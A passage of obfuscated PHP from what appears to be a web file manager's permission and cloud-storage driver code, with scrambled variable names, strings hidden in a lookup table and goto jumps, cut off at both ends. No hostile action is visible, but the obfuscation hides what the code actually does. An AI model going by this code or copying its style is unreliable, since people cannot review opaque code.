foreach ($îş‚ŠˆÅ as $•’çÈ¥¼) { $ÏÊ¯˜±† = $this->authInfo($•’çÈ¥¼); if ($•’çÈ¥¼[$’ß¢¾‹ì[589]] == $’ß¢¾‹ì[228]) { $ëƒÌéÂ = !0; } if ($•’çÈ¥¼[$’ß¢¾‹ì[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÏÊ¯˜±†[$’ß¢¾‹ì[502]])) { $ßøİ÷¨º[] = $•’çÈ¥¼[$’ß¢¾‹ì[589]]; } } } return array($’ß¢¾‹ì[684] => $ßøİ÷¨º, $’ß¢¾‹ì[2391] => $ëƒÌéÂ); } public function authMake($®Æ›‘¤Ğ, $àÒï¢ùÔ = false) { $â©ÛßíÎ =& $_SERVER[¹Éµ„ºå]; $¯Â›ˆØƒ = $this->authArrayCheck($®Æ›‘¤Ğ, $àÒï¢ùÔ); if ($¯Â›ˆØƒ[$â©ÛßíÎ[2372]]) { $¯Â›ˆØƒ[$â©ÛßíÎ[2372]] = $this->sourceAuthInfo($¯Â›ˆØƒ[$â©ÛßíÎ[2372]]); } return $¯Â›ˆØƒ; } public function authArrayCheck($Ööì³ÌÎ, $õ‰’²ûè = false) { $‡¶‹şÉ¯ =& $_SERVER[¹Éµ„ºå]; if (!$Ööì³ÌÎ) { return array($‡¶‹şÉ¯[503] => 0, $‡¶‹şÉ¯[556] => !1, $‡¶‹şÉ¯[2387] => $‡¶‹şÉ¯[12]); } $õ‰’²ûè = $õ‰’²ûè ? $õ‰’²ûè : USER_ID; $€«²Ò ¹ = 0; $·±ì¸ùŞ = 0; $©œœİ§Ó = 0; $·‡ª¢“Í = 0; $Ä¢ß‘Í¡ = 0; $¬ĞŒ¾§ = 0; $ì› ö‚ = 0; $‹¿ÊûÎğ = 0; $èÈıªíŠ = 1000; $³«š¯íÕ = 0; $ù›‰áõÜ = 0; $ƒ£óŞ¥• = 0; $™íÅ›ÂÄ = 0; $êñ¯Ëö² = 0; foreach ($Ööì³ÌÎ as $ş¾ÏœÕÈ) { $‰æ©á¢ = $this->authInfo($ş¾ÏœÕÈ); if (!$‰æ©á¢) { continue; } $‹íÕ”Òù = $ş¾ÏœÕÈ[$‡¶‹şÉ¯[589]]; $Ù˜çÁı = $ş¾ÏœÕÈ[$‡¶‹şÉ¯[191]]; $ŞŠÃËÄ = intval($‰æ©á¢[$‡¶‹şÉ¯[502]]); if ($ş¾ÏœÕÈ[$‡¶‹şÉ¯[188]] == SourceModel::TYPE_USER && $‹íÕ”Òù == $õ‰’²ûè) { $€«²Ò ¹ = !0; $©œœİ§Ó = $‰æ©á¢; $·±ì¸ùŞ = $ŞŠÃËÄ; $·‡ª¢“Í = $Ù˜çÁı; } else { if ($ş¾ÏœÕÈ[$‡¶‹şÉ¯[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‹íÕ”Òù, $õ‰’²ûè)) { $Ä¢ß‘Í¡ = !0; $ş‡›®È = $this->groupStepToUserGroup($‹íÕ”Òù, $õ‰’²ûè); if ($ş‡›®È < $èÈıªíŠ) { $èÈıªíŠ = $ş‡›®È; $¬ĞŒ¾§ = $ŞŠÃËÄ; $ì› ö‚ = $‰æ©á¢; $³«š¯íÕ = $‹íÕ”Òù; $‹¿ÊûÎğ = $Ù˜çÁı; } if ($ş‡›®È == $èÈıªíŠ && $ŞŠÃËÄ >= $¬ĞŒ¾§) { $¬ĞŒ¾§ = $ŞŠÃËÄ; $ì› ö‚ = $‰æ©á¢; $³«š¯íÕ = $‹íÕ”Òù; $‹¿ÊûÎğ = $Ù˜çÁı; } } else { if (!$‹íÕ”Òù || $‹íÕ”Òù == $‡¶‹şÉ¯[228]) { $ù›‰áõÜ = !0; $™íÅ›ÂÄ = $‰æ©á¢; $ƒ£óŞ¥• = $ŞŠÃËÄ; $êñ¯Ëö² = $Ù˜çÁı; } } } } if ($€«²Ò ¹) { $ì‘Íúéƒ = $·±ì¸ùŞ; $‰æ©á¢ = $©œœİ§Ó; $€¶ÍÍ±Ÿ = $·‡ª¢“Í; $»Ü½åˆ = LNG($‡¶‹şÉ¯[2393]); } else { if ($Ä¢ß‘Í¡) { $ì‘Íúéƒ = $¬ĞŒ¾§; $‰æ©á¢ = $ì› ö‚; $€¶ÍÍ±Ÿ = $‹¿ÊûÎğ; $ã”¹·òñ = Model($‡¶‹şÉ¯[605])->getInfo($³«š¯íÕ); $»Ü½åˆ = $‡¶‹şÉ¯[173] . $ã”¹·òñ[$‡¶‹şÉ¯[609]] . $‡¶‹şÉ¯[2394] . LNG($‡¶‹şÉ¯[2395]); } else { if ($ù›‰áõÜ) { $ì‘Íúéƒ = $ƒ£óŞ¥•; $‰æ©á¢ = $™íÅ›ÂÄ; $€¶ÍÍ±Ÿ = $êñ¯Ëö²; $»Ü½åˆ = LNG($‡¶‹şÉ¯[2374]); } else { $ì‘Íúéƒ = 0; $‰æ©á¢ = !1; $»Ü½åˆ = $‡¶‹şÉ¯[12]; $€¶ÍÍ±Ÿ = $‡¶‹şÉ¯[12]; } } } $úµÜ¯“À = array($‡¶‹şÉ¯[2386] => intval($ì‘Íúéƒ), $‡¶‹şÉ¯[2376] => $‰æ©á¢, $‡¶‹şÉ¯[2387] => $»Ü½åˆ, $‡¶‹şÉ¯[2382] => $€¶ÍÍ±Ÿ); return $úµÜ¯“À; } private function groupContainUser($ÊĞ¬©ç, $¿÷‰—Ïğ = false) { return in_array($ÊĞ¬©ç, $this->userGroupParents($¿÷‰—Ïğ)); } private function groupStepToUserGroup($ßÈ¾Àİ, $Ûú¯ÖÖ™ = false) { $£Ëãçæá =& $_SERVER[¹Éµ„ºå]; $Î—¢Âü¿ = $this->userGroupList($Ûú¯ÖÖ™); $Õ§²ÇÙò = 1000; $ÚÒÊÛŠ˜ = $GLOBALS[$£Ëãçæá[6]][$£Ëãçæá[92]][$£Ëãçæá[2278]] == 1; $–ö‘§× = $ÚÒÊÛŠ˜ ? 3 : 2; foreach ($Î—¢Âü¿ as $ëçó¿Çá) { if ($ëçó¿Çá[$£Ëãçæá[1484]] == $ßÈ¾Àİ) { return 0; } $ƒÛë™ğø = explode($£Ëãçæá[50], trim($ëçó¿Çá[$£Ëãçæá[604]], $£Ëãçæá[50])); if ($ƒÛë™ğø[0] == $£Ëãçæá[228] && count($ƒÛë™ğø) > $–ö‘§×) { $ÛÎ“€‘ƒ = array_reverse(array_slice($ƒÛë™ğø, $–ö‘§×)); $ğÛ™‹Ù = array_search($ßÈ¾Àİ, $ÛÎ“€‘ƒ); if ($ğÛ™‹Ù !== !1 && $ğÛ™‹Ù + 1 <= $Õ§²ÇÙò) { $Õ§²ÇÙò = $ğÛ™‹Ù + 1; } } } return $Õ§²ÇÙò; } private function userGroupList($âìÌ‰·‹ = false, $üéç‘öû = false) { $…ËÈ¦¶Ö =& $_SERVER[¹Éµ„ºå]; static $ßÁÏ¼¬ = array(); if (isset($ßÁÏ¼¬[$âìÌ‰·‹])) { return $ßÁÏ¼¬[$âìÌ‰·‹]; } if (!$üéç‘öû) { $üéç‘öû = Model($…ËÈ¦¶Ö[617])->getInfo($âìÌ‰·‹); } $ßÁÏ¼¬[$âìÌ‰·‹] = array_to_keyvalue($üéç‘öû[$…ËÈ¦¶Ö[1483]], $…ËÈ¦¶Ö[1484]); return $ßÁÏ¼¬[$âìÌ‰·‹]; } public function userGroupParents($£Ï§‚³®) { $èšº™ =& $_SERVER[¹Éµ„ºå]; static $¶‘ãºÍ­ = array(); $£Ï§‚³® = $£Ï§‚³® ? $£Ï§‚³® : USER_ID; if (isset($¶‘ãºÍ­[$£Ï§‚³®])) { return $¶‘ãºÍ­[$£Ï§‚³®]; } $òÚö«îô = $this->userGroupList($£Ï§‚³®); $½¯Ùª’Ó = array(); $Ÿ™»ßÉË = $GLOBALS[$èšº™[6]][$èšº™[92]][$èšº™[2278]] == 1; $™‚îÕÄ§ = $Ÿ™»ßÉË ? 3 : 2; foreach ($òÚö«îô as $§Ÿ¥¢Ğ) { $êÓ“ÉıØ = array($§Ÿ¥¢Ğ[$èšº™[1484]]); $ƒÅàÒ¼Õ = explode($èšº™[50], trim($§Ÿ¥¢Ğ[$èšº™[604]], $èšº™[50])); if ($ƒÅàÒ¼Õ[0] == $èšº™[228] && count($ƒÅàÒ¼Õ) > $™‚îÕÄ§) { $ã¢¹ß©è = array_slice($ƒÅàÒ¼Õ, $™‚îÕÄ§); $êÓ“ÉıØ = array_merge($êÓ“ÉıØ, array_reverse($ã¢¹ß©è)); } $½¯Ùª’Ó = array_merge($½¯Ùª’Ó, $êÓ“ÉıØ); } $¶‘ãºÍ­[$£Ï§‚³®] = array_unique($½¯Ùª’Ó); return $¶‘ãºÍ­[$£Ï§‚³®]; } public function authTargetInfoMake($Ã–·ŒÄõ) { $ÒÔû—­ =& $_SERVER[¹Éµ„ºå]; $´…•§«€ = array(); $šÅ¥Î˜î = array(); foreach ($Ã–·ŒÄõ as $­´Å‘Òß) { if ($­´Å‘Òß[$ÒÔû—­[188]] == SourceModel::TYPE_USER) { $´…•§«€[] = intval($­´Å‘Òß[$ÒÔû—­[589]]); } else { if ($­´Å‘Òß[$ÒÔû—­[188]] == SourceModel::TYPE_GROUP) { $šÅ¥Î˜î[] = intval($­´Å‘Òß[$ÒÔû—­[589]]); } } } if ($´…•§«€) { $´…•§«€ = Model($ÒÔû—­[597])->userListInfo($´…•§«€); } if ($šÅ¥Î˜î) { $ïäÙè = array($ÒÔû—­[2258] => array($ÒÔû—­[507], $šÅ¥Î˜î)); $šÅ¥Î˜î = Model($ÒÔû—­[605])->field($ÒÔû—­[2396])->where($ïäÙè)->select(); $šÅ¥Î˜î = array_to_keyvalue($šÅ¥Î˜î, $ÒÔû—­[1484]); } return array($ÒÔû—­[2397] => $´…•§«€, $ÒÔû—­[2398] => $šÅ¥Î˜î); } public function authInfo($´€É¡) { $ìË¿„†Ö =& $_SERVER[¹Éµ„ºå]; if ($´€É¡[$ìË¿„†Ö[1630]]) { $ÁÛ¿‹À = Model($ìË¿„†Ö[591])->listData($´€É¡[$ìË¿„†Ö[1630]]); if (!$ÁÛ¿‹À) { return !1; $¹¤“™®¢ = Model($ìË¿„†Ö[591])->listData(); $½ü³‚¤¢ = array_filter_by_field($¹¤“™®¢, $ìË¿„†Ö[502], $ìË¿„†Ö[228]); return $½ü³‚¤¢; } $¢Õüäù = array_field_key($ÁÛ¿‹À, array($ìË¿„†Ö[487], $ìË¿„†Ö[32], $ìË¿„†Ö[502], $ìË¿„†Ö[2192], $ìË¿„†Ö[2193])); $¢Õüäù[$ìË¿„†Ö[2399]] = $´€É¡; return $¢Õüäù; } else { return array($ìË¿„†Ö[508] => 0, $ìË¿„†Ö[2177] => $´€É¡[$ìË¿„†Ö[2334]], $ìË¿„†Ö[509] => $ìË¿„†Ö[12], $ìË¿„†Ö[2192] => $ìË¿„†Ö[2400]); } } } goto B™ ê¦­; AóÎÔ«†Ÿ„: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($æ°¸éºÛ) { parent::__construct($æ°¸éºÛ); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } public function fileOutImage($³¸ï¡µ, $àŞ¾ÓÀ™ = 250) { $ËÄıÃ¬ =& $_SERVER[¹Éµ„ºå]; if ($this->size($³¸ï¡µ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($³¸ï¡µ, $àŞ¾ÓÀ™); } $Ä¶°ÇÌ÷ = array($ËÄıÃ¬[1657] => $ËÄıÃ¬[1658] . $àŞ¾ÓÀ™ . $ËÄıÃ¬[1659]); $İë¡ÛÃ = $this->link($³¸ï¡µ, $Ä¶°ÇÌ÷); $this->fileOutLink($İë¡ÛÃ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($œĞ®«ú) { parent::__construct($œĞ®«ú); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } public function uploadFormData($¾ğàª€®, $êÜ¢¨Â´ = 3600) { return $this->uploadFormDataV2($¾ğàª€®, $êÜ¢¨Â´); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Ú©îã¶µ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹Éµ„ºå][1660]; $this->_init($Ú©îã¶µ); } public function _init($ô‰¢ß§²) { $áıÂ·Î¶ =& $_SERVER[¹Éµ„ºå]; $this->config = $ô‰¢ß§²; foreach ($ô‰¢ß§² as $¸Ïá“úª => $úä”‹Ş) { if (isset($this->{$¸Ïá“úª})) { $this->{$¸Ïá“úª} = $úä”‹Ş; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($áıÂ·Î¶[1661] . LNG($áıÂ·Î¶[1662])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¯¬öâÊù =& $_SERVER[¹Éµ„ºå]; $ÔŒÁôšƒ = new OSS\Model\CorsConfig(); $”¹¿×Ù‘ = new OSS\Model\CorsRule(); $”¹¿×Ù‘->addAllowedOrigin($¯¬öâÊù[1663]); $”¹¿×Ù‘->addAllowedMethod($¯¬öâÊù[1664]); $”¹¿×Ù‘->addAllowedMethod($¯¬öâÊù[1665]); $”¹¿×Ù‘->addAllowedMethod($¯¬öâÊù[1666]); $”¹¿×Ù‘->addAllowedMethod($¯¬öâÊù[1667]); $”¹¿×Ù‘->addAllowedMethod($¯¬öâÊù[162]); $”¹¿×Ù‘->setMaxAgeSeconds(600); $”¹¿×Ù‘->addExposeHeader($¯¬öâÊù[1668]); $”¹¿×Ù‘->addAllowedHeader($¯¬öâÊù[1663]); $ÔŒÁôšƒ->addRule($”¹¿×Ù‘); try { $this->client->putBucketCors($this->bucket, $ÔŒÁôšƒ); } catch (OSS\Core\OssException $´ÖŠªÌ) { $this->writeLog(__FUNCTION__ . $¯¬öâÊù[212] . $´ÖŠªÌ->getMessage()); return !1; } return !0; } public function getBucketCors() { $Áïº”“Ñ =& $_SERVER[¹Éµ„ºå]; $¬öÎÉó¦ = null; try { $¬öÎÉó¦ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $È¯’Ú¸–) { $this->writeLog(__FUNCTION__ . $Áïº”“Ñ[212] . $È¯’Ú¸–->getMessage()); return null; } if (!$¬öÎÉó¦ || !($©Ïñş¥‰ = $¬öÎÉó¦->getRules())) { return null; } $œÍ†Õ¡¿ = $©Ïñş¥‰[0]->getAllowedOrigins(); $·á­ĞŞœ = $©Ïñş¥‰[0]->getAllowedMethods(); $¾¾öÚÑ = $©Ïñş¥‰[0]->getMaxAgeSeconds(); $¨Êğ“ş¡ = $©Ïñş¥‰[0]->getExposeHeaders(); $°¶èÎ™Â = $©Ïñş¥‰[0]->getAllowedHeaders(); return array($Áïº”“Ñ[218] => isset($œÍ†Õ¡¿[0]) ? $œÍ†Õ¡¿[0] : $Áïº”“Ñ[12], $Áïº”“Ñ[222] => $·á­ĞŞœ, $Áïº”“Ñ[1669] => $¾¾öÚÑ, $Áïº”“Ñ[1670] => isset($¨Êğ“ş¡[0]) ? $¨Êğ“ş¡[0] : $Áïº”“Ñ[12], $Áïº”“Ñ[219] => isset($°¶èÎ™Â[0]) ? $°¶èÎ™Â[0] : $Áïº”“Ñ[12]); } public function isBucketCors() { $©óø¿—² =& $_SERVER[¹Éµ„ºå]; $‚ÎÚÀâ‰ = $this->getBucketCors(); if (!$‚ÎÚÀâ‰ || !is_array($‚ÎÚÀâ‰)) { return !1; } if ($‚ÎÚÀâ‰[$©óø¿—²[218]] != $©óø¿—²[220] || $‚ÎÚÀâ‰[$©óø¿—²[219]] != $©óø¿—²[220]) { return !1; } $ëÚªâÎë = array_map($©óø¿—²[221], $‚ÎÚÀâ‰[$©óø¿—²[222]]); if (!is_array($ëÚªâÎë)) { $ëÚªâÎë = array(); } $åä¥ññ¼ = array($©óø¿—²[223], $©óø¿—²[224], $©óø¿—²[225], $©óø¿—²[226], $©óø¿—²[227]); $»˜¡ŠÖ = array_diff($åä¥ññ¼, $ëÚªâÎë); return empty($»˜¡ŠÖ); } public function mkfile($ş°ÖÅÅ¦, $ÃËáç…Î = '', $‰´õÌÈ¾ = REPEAT_RENAME) { $ÃõŠª¢ = $this->setContent($ş°ÖÅÅ¦, $ÃËáç…Î); if ($ÃõŠª¢ !== !1) { return $this->getPathOuter($ş°ÖÅÅ¦); } return !1; } public function mkdir($Ÿõ®íú, $‡ş”­ç = REPEAT_SKIP) { if ($‡ş”­ç && $this->_isFolder($Ÿõ®íú)) { return $this->getPathOuter($Ÿõ®íú); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ÿõ®íú)); } catch (OSS\Core\OssException $òŞòğÛ) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $òŞòğÛ->getMessage()); return !1; } return $this->getPathOuter($Ÿõ®íú); } private function fileList($ò…ÑÃ¨, $ó—¤Á¨œ = '', $çæ•Á©À = 0) { $„ß¿¦–Å =& $_SERVER[¹Éµ„ºå]; $ò…ÑÃ¨ = trim($ò…ÑÃ¨, $„ß¿¦–Å[8]); $Ÿè¿šÙæ = empty($ò…ÑÃ¨) && $ò…ÑÃ¨ !== $„ß¿¦–Å[228] ? $„ß¿¦–Å[12] : $ò…ÑÃ¨ . $„ß¿¦–Å[8]; $é¬Ğ¿³ı = $„ß¿¦–Å[12]; $ó£ÜÅï’ = 1000; $š£ˆùŒÁ = $¼°«ùŞ = array(); while (!0) { check_abort(); $ÆÉ­¬¢  = array($„ß¿¦–Å[1671] => $ó—¤Á¨œ, $„ß¿¦–Å[1672] => $Ÿè¿šÙæ, $„ß¿¦–Å[1673] => $ó£ÜÅï’, $„ß¿¦–Å[1674] => $é¬Ğ¿³ı); try { $‰¿ñÕÎ = $this->client->listObjects($this->bucket, $ÆÉ­¬¢ ); } catch (OSS\Core\OssException $íÕ»³¡) { $this->writeLog(__FUNCTION__ . $„ß¿¦–Å[212] . $íÕ»³¡->getMessage()); break; } $é¬Ğ¿³ı = $‰¿ñÕÎ->getNextMarker(); $ƒë¶¤¥¡ = $‰¿ñÕÎ->getObjectList(); $çàèÔ = $‰¿ñÕÎ->getPrefixList(); foreach ($ƒë¶¤¥¡ as $´¢¥ï™›) { if ($´¢¥ï™›->getKey() == $Ÿè¿šÙæ) { continue; } $‘Å‡ìØè = $´¢¥ï™›->getKey(); $‡¼Èà‡ê = $´¢¥ï™›->getSize(); $ÂÃüÊí¢ = $´¢¥ï™›->getLastModified(); $’¼™ÆÀ¦ = trim($´¢¥ï™›->getETag(), $„ß¿¦–Å[118]); $•½¨şšÖ = $çæ•Á©À ? array($„ß¿¦–Å[32] => $‘Å‡ìØè, $„ß¿¦–Å[79] => $‡¼Èà‡ê, $„ß¿¦–Å[204] => strtotime($ÂÃüÊí¢), $„ß¿¦–Å[1675] => $’¼™ÆÀ¦) : $‘Å‡ìØè; $ÍÉÖ×ò = $‡¼Èà‡ê == 0 && substr($‘Å‡ìØè, strlen($‘Å‡ìØè) - 1, 1) == $„ß¿¦–Å[8] ? !0 : !1; $È±¿á³¼ = array($„ß¿¦–Å[79] => $‡¼Èà‡ê, $„ß¿¦–Å[1676] => $‡¼Èà‡ê, $„ß¿¦–Å[88] => strtotime($ÂÃüÊí¢), $„ß¿¦–Å[1677] => $ÂÃüÊí¢, $„ß¿¦–Å[1675] => $’¼™ÆÀ¦); $this->cacheMethodInfoSet($‘Å‡ìØè, $ÍÉÖ×ò, $È±¿á³¼); if ($ÍÉÖ×ò) { $š£ˆùŒÁ[] = $‘Å‡ìØè; continue; } $¼°«ùŞ[] = $•½¨şšÖ; } foreach ($çàèÔ as $¿éÔ¹Ãß) { $š£ˆùŒÁ[] = $¿éÔ¹Ãß->getPrefix(); $this->cacheMethodInfoSet($¿éÔ¹Ãß->getPrefix(), !0); } if ($é¬Ğ¿³ı === $„ß¿¦–Å[12]) { break; } } $this->cacheMethodInfoSet($ò…ÑÃ¨, !0); return array($„ß¿¦–Å[85] => $š£ˆùŒÁ, $„ß¿¦–Å[86] => $¼°«ùŞ); } public function listObject($ƒšŞô¸, $ƒ·ÁÛ½™ = '') { $ËÍÔççï =& $_SERVER[¹Éµ„ºå]; $ƒšŞô¸ = trim($ƒšŞô¸, $ËÍÔççï[8]); $Ëî²²ÍÏ = empty($ƒšŞô¸) && $ƒšŞô¸ !== $ËÍÔççï[228] ? $ËÍÔççï[12] : $ƒšŞô¸ . $ËÍÔççï[8]; $õÇ˜€’ = $ËÍÔççï[12]; $Ğ¬¯ª® = 1000; $¬ØÏùë¢ = $³«ÀÚ£Œ = array(); while (!0) { check_abort(); $ú¥Ê³ÁÌ = array($ËÍÔççï[1671] => $ƒ·ÁÛ½™, $ËÍÔççï[1672] => $Ëî²²ÍÏ, $ËÍÔççï[1673] => $Ğ¬¯ª®, $ËÍÔççï[1674] => $õÇ˜€’); try { $ìøÓÀã = $this->client->listObjects($this->bucket, $ú¥Ê³ÁÌ); } catch (OSS\Core\OssException $Éöèšë) { $this->writeLog(__FUNCTION__ . $ËÍÔççï[212] . $Éöèšë->getMessage()); break; } $õÇ˜€’ = $ìøÓÀã->getNextMarker(); $ğÕœ‘Ğ = $ìøÓÀã->getObjectList(); foreach ($ğÕœ‘Ğ as $¶á›Èîù) { if ($¶á›Èîù->getKey() == $Ëî²²ÍÏ) { continue; } $åõÁÌìñ = $¶á›Èîù->getKey(); $÷“´ÈÈğ = $¶á›Èîù->getSize(); $äéùİú‡ = $÷“´ÈÈğ == 0 && substr($åõÁÌìñ, strlen($åõÁÌìñ) - 1, 1) == $ËÍÔççï[8] ? !0 : !1; if ($äéùİú‡) { continue; } $³«ÀÚ£Œ[] = $÷“´ÈÈğ . $ËÍÔççï[212] . $åõÁÌìñ; } if ($õÇ˜€’ === $ËÍÔççï[12]) { break; } } return array($ËÍÔççï[85] => $¬ØÏùë¢, $ËÍÔççï[86] => $³«ÀÚ£Œ); } public function copyFile($´­ñî”, $‹‰ÀÓî) { $ş€®•ã§ = $this->size($´­ñî”); if ($ş€®•ã§ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $´­ñî”, $this->bucket, $this->pathEncode($‹‰ÀÓî)); } catch (OSS\Core\OssException $ÒÄüœÕœ) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $ÒÄüœÕœ->getMessage()); return !1; } return $this->getPathOuter($‹‰ÀÓî); } $­Şı÷á¾ = $this->multiCopyObject($´­ñî”, $‹‰ÀÓî, $ş€®•ã§); return $­Şı÷á¾ ? $this->getPathOuter($‹‰ÀÓî) : !1; } private function multiCopyObject($•êøßÖ—, $ªÌßÙ¤ã, $¾Ÿ¯é‘) { $ü‘ùãé§ =& $_SERVER[¹Éµ„ºå]; try { $™ú˜…– = array(); if ($†…âÒ¾ = $this->hashMd5($•êøßÖ—)) { $™ú˜…– = array(OSS\OssClient::OSS_HEADERS => array($ü‘ùãé§[1678] => $†…âÒ¾)); } $À“şŒê˜ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ªÌßÙ¤ã), $™ú˜…–); $ìõèÛ¼Š = 1; $Ó¿ó¿Ûİ = 0; $•¿ï‚Ù® = array(); $«ˆœ¢ = 1024 * 1024 * 10; $äŞ¤‰åù = $this->client->generateMultiuploadParts($¾Ÿ¯é‘, $«ˆœ¢); foreach ($äŞ¤‰åù as $è®‘ÜĞ => $Ü’£ˆá÷) { $Ø×Ë£³ù = $Ó¿ó¿Ûİ + (int) $Ü’£ˆá÷[$ü‘ùãé§[1679]]; $ˆ¢Àôˆ = (int) $Ü’£ˆá÷[$ü‘ùãé§[412]] + $Ø×Ë£³ù - 1; $ãÌçÇÂº = array($ü‘ùãé§[164] => $Ø×Ë£³ù, $ü‘ùãé§[165] => $ˆ¢Àôˆ); $•¿ï‚Ù®[] = $this->client->uploadPartCopy($this->bucket, $•êøßÖ—, $this->bucket, $this->pathEncode($ªÌßÙ¤ã), $ìõèÛ¼Š, $À“şŒê˜, $ãÌçÇÂº); $ìõèÛ¼Š = $ìõèÛ¼Š + 1; } $ö™ÃÄÔ‡ = array(); foreach ($•¿ï‚Ù® as $è®‘ÜĞ => $®ÃÒÈæ¿) { $ö™ÃÄÔ‡[] = array($ü‘ùãé§[297] => $è®‘ÜĞ + 1, $ü‘ùãé§[298] => $®ÃÒÈæ¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ªÌßÙ¤ã), $À“şŒê˜, $ö™ÃÄÔ‡); } catch (OSS\Core\OssException $¡ñ†ãÇë) { $this->writeLog(__FUNCTION__ . $ü‘ùãé§[212] . $¡ñ†ãÇë->getMessage()); return !1; } return !0; } public function moveFile($ƒÜ¶¹ğó, $Û“¼ßİ ) { if ($this->copyFile($ƒÜ¶¹ğó, $Û“¼ßİ )) { $this->remove($ƒÜ¶¹ğó); return $this->getPathOuter($Û“¼ßİ ); } return !1; } public function delFile($Ì˜€ŸÏø) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ì˜€ŸÏø)); } catch (OSS\Core\OssException $ÏğşÜ³÷) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $ÏğşÜ³÷->getMessage()); return !1; } return !0; } public function delFolder($Ïæ€ÍĞİ) { $’„Ô²Ç =& $_SERVER[¹Éµ„ºå]; if (!$this->exist($Ïæ€ÍĞİ)) { return !0; } $this->listItemCache = !1; $ƒœáÇ”û = $this->fileList($Ïæ€ÍĞİ); $this->listItemCache = !0; $±Ìïå¶ª = trim($Ïæ€ÍĞİ, $’„Ô²Ç[8]) . $’„Ô²Ç[8]; if (!empty($Ïæ€ÍĞİ) && $Ïæ€ÍĞİ !== $’„Ô²Ç[228] && !in_array($±Ìïå¶ª, $ƒœáÇ”û[$’„Ô²Ç[85]])) { $ƒœáÇ”û[$’„Ô²Ç[85]][] = $±Ìïå¶ª; } $¤§ÒÚíñ = $this->delByBatch($ƒœáÇ”û[$’„Ô²Ç[86]]); if (!$¤§ÒÚíñ) { return !1; } $¤§ÒÚíñ = $this->delByBatch($ƒœáÇ”û[$’„Ô²Ç[85]]); if (!$¤§ÒÚíñ) { return !1; } return $this->delFile($±Ìïå¶ª); } private function delByBatch($Ê˜Òê©) { foreach (array_chunk($Ê˜Òê©, 1000) as $è°¦Ñğº) { try { $this->client->deleteObjects($this->bucket, $è°¦Ñğº); } catch (OSS\Core\OssException $ş‰È¼ÆŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][212] . $ş‰È¼ÆŠ->getMessage()); return !1; } } return !0; } public function rename($¤šìšÖ, $ú—ì‡ÔÕ) { return $this->renameObject($¤šìšÖ, $ú—ì‡ÔÕ); } private function fileInfo($ûöÏ·¯Ö, $œ¨›…¶ = false, $ç•™†“£ = array()) { $õæàñ =& $_SERVER[¹Éµ„ºå]; $Äºˆâªá = array($õæàñ[32] => $this->pathThis($ûöÏ·¯Ö), $õæàñ[87] => $this->getPathOuter($ûöÏ·¯Ö), $õæàñ[33] => $õæàñ[230], $õæàñ[79] => isset($ç•™†“£[$õæàñ[79]]) ? $ç•™†“£[$õæàñ[79]] : 0, $õæàñ[166] => $this->ext($ûöÏ·¯Ö)); if ($œ¨›…¶) { return $Äºˆâªá; } $Äºˆâªá[$õæàñ[231]] = $Äºˆâªá[$õæàñ[88]] = 0; $Äºˆâªá[$õæàñ[232]] = $Äºˆâªá[$õæàñ[233]] = !0; if (empty($ç•™†“£)) { $Ô¡ËãÍâ = $this->objectMeta($ûöÏ·¯Ö); if (!$Ô¡ËãÍâ) { return $Äºˆâªá; } $ç•™†“£ = array($õæàñ[88] => strtotime($Ô¡ËãÍâ[$õæàñ[1677]]), $õæàñ[79] => $Ô¡ËãÍâ[$õæàñ[1676]] + 0, $õæàñ[1675] => $Ô¡ËãÍâ[$õæàñ[1675]]); } if (isset($ç•™†“£[$õæàñ[1675]]) && $ç•™†“£[$õæàñ[1675]]) { $Äºˆâªá[$õæàñ[235]] = trim($ç•™†“£[$õæàñ[1675]], $õæàñ[118]); } if (isset($ç•™†“£[$õæàñ[79]])) { $Äºˆâªá[$õæàñ[79]] = $ç•™†“£[$õæàñ[79]]; } if (isset($ç•™†“£[$õæàñ[88]])) { $Äºˆâªá[$õæàñ[88]] = $ç•™†“£[$õæàñ[88]]; } if (isset($ç•™†“£[$õæàñ[204]]) && !trim($Äºˆâªá[$õæàñ[88]])) { $Äºˆâªá[$õæàñ[88]] = $ç•™†“£[$õæàñ[204]]; } return $Äºˆâªá; } private function folderInfo($–¬ÒÚ¾š, $ÔåóÀÍ = false, $™é†ú¼ƒ = array()) { $Ş²ŒòÂ =& $_SERVER[¹Éµ„ºå]; $¼î¥·ö¯ = array($Ş²ŒòÂ[32] => $this->pathThis($–¬ÒÚ¾š), $Ş²ŒòÂ[87] => $this->getPathOuter($Ş²ŒòÂ[8] . $–¬ÒÚ¾š), $Ş²ŒòÂ[33] => $Ş²ŒòÂ[78]); if ($ÔåóÀÍ) { return $¼î¥·ö¯; } $¼î¥·ö¯[$Ş²ŒòÂ[231]] = $¼î¥·ö¯[$Ş²ŒòÂ[88]] = 0; $¼î¥·ö¯[$Ş²ŒòÂ[232]] = $¼î¥·ö¯[$Ş²ŒòÂ[233]] = !0; if (empty($™é†ú¼ƒ)) { $–¬ÒÚ¾š = rtrim($–¬ÒÚ¾š, $Ş²ŒòÂ[8]) . $Ş²ŒòÂ[8]; $¢÷ü ÒÜ = $this->objectMeta($–¬ÒÚ¾š); if (!$¢÷ü ÒÜ) { return $¼î¥·ö¯; } 